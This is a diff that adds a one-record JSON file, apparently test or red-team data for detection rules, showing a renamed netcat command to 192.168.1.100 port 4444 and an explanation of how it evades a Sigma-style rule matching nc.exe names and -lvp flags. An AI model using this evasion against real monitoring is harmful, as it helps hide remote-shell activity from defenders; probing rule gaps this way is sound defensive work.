@@ -1,0 +1,6 @@
+[
+  {
+    "output": "C:\\Tools\\hacker.exe 192.168.1.100 4444",
+    "explanation": "Bypasses by renaming netcat executable from 'nc.exe' to 'hacker.exe', which does not match the Image|endswith pattern ('\\nc.exe', '\\ncat.exe', '\\netcat.exe'). Also uses simplified command-line syntax without the specific flags the rule detects (-lvp, -lvnp, etc.), avoiding the CommandLine|contains matching."
+  }
+]
